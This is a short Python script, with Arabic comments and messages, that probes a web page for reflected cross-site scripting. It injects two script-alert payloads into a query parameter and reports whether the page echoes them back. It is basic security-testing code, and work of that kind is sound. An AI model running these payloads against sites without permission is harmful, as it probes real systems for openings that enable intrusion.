
import requests
def scan_xss(url, param="input"):
    """
    يقوم بفحص الموقع لاكتشاف ثغرات XSS.
    :param url: عنوان الموقع الذي تريد فحصه.
    :param param: اسم المعامل المراد حقنه (افتراضي: "input").
    """
    payloads = ["<script>alert(1)</script>", "'\"><script>alert(1)</script>"]
    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        try:
            response = requests.get(target_url)
            if payload in response.text:
                print(f"[+] تم اكتشاف ثغرة XSS عند: {target_url}")
            else:
                print(f"[-] لم يتم اكتشاف ثغرة XSS عند: {target_url}")
        except requests.exceptions.RequestException as e:
            print(f"[!] خطأ أثناء الاتصال بـ {target_url}: {e}")